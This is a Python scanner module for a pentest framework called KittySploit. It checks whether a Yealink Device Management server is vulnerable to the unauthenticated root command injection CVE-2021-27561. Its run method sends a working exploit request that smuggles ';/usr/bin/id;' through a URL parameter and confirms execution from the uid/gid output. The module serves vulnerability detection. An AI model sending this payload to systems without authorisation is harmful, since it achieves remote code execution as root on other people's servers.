#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Yealink Device Management (DM) 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'YeaLink DM 3.6.0.20 - Remote Command Injection Detection',
        'description': 'Yealink Device Management (DM) 3.6.0.20 allows command injection as root via the /sm/api/v1/firewall/zone/services URI, without authentication.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'rce', 'yealink', 'mirai', 'kev', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://ssd-disclosure.com/ssd-advisory-yealink-dm-pre-auth-root-level-rce/',
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-27561',
            'https://ssd-disclosure.com/?p=4688',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2021-27561',
    }

    def run(self):
        r = self.http_request(method="GET", path='/premise/front/getPingData?url=http://0.0.0.0:9600/sm/api/v1/firewall/zone/services?zone=;/usr/bin/id;', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('uid', 'gid', 'groups',)
        header_any = ('application/json',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='critical',
                reason="YeaLink DM 3.6.0.20 - Remote Command Injection detected",
                path='/premise/front/getPingData?url=http://0.0.0.0:9600/sm/api/v1/firewall/zone/services?zone=;/usr/bin/id;',
            )
            return True
        return False

